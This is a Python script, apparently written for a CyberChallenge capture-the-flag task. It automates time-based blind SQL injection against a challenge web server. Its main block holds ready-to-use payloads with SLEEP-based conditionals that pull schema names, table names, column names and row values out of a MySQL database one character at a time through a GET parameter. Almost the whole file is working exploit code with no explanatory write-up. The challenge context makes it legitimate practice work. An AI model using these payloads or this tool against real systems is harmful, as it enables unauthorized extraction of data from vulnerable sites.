import requests, time
from typing import Callable

try:
  from deep_time_search import deep_time_search
except ModuleNotFoundError:
  from search.deep_time_search import deep_time_search

__all__ = 'offset_time_search'.split()



def offset_time_search(get_send_request: Callable, d_time: float, index=0, value=''):

  # convert starting_value in hexadecimal form
  value = ''.join([hex(ord(i))[2:] for i in value])

  timer = time.time()

  results = []

  while True:
    r = deep_time_search(get_send_request(index), d_time, value)
    if r == ['']:
      break
    index += 1
    print('index', index)
    results += r
    print('RESULT:', r)
      
  timer = time.time() - timer
  print("offset execution time:", timer)

  print(results)
  return results


if __name__ == '__main__':

  # db
  # MEGA_QUERY = '''\
  # " /*'OR(IF((SELECT HEX(SCHEMA_NAME) FROM information_schema.schemata LIMIT 1 OFFSET {2}) LIKE '{1}%',SLEEP({0}),1)) -- \
  # '''

  # table
  # MEGA_QUERY = '''\
  # " /*'OR(IF((SELECT HEX(table_name) FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1 OFFSET {2}) LIKE '{1}%',SLEEP({0}),1)) -- \
  # '''

  # column
  # MEGA_QUERY = '''\
  # " /*'OR(IF((SELECT HEX(column_name) FROM information_schema.columns WHERE table_name='flaggy' LIMIT 1 OFFSET {2}) LIKE '{1}%',SLEEP({0}),1)) -- \
  # '''

  # value
  MEGA_QUERY = '''\
  " /*'OR(IF((SELECT HEX(now) FROM flaggy LIMIT 1 OFFSET {2}) LIKE '{1}%',SLEEP({0}),1)) -- \
  '''

  TIME = .5


  def get_send_request(index:int):

    global MEGA_QUERY
    query = MEGA_QUERY.format('{0}','{1}', index)
    print('index', index)

    def send_request(value:str):
      url = "http://filtered.challs.cyberchallenge.it:80/post.php?id={}".format(query.format(TIME/4, value, index))
      headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate", "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
      requests.get(url, headers=headers)

    return send_request


  print(offset_time_search(get_send_request, TIME, 0, ''))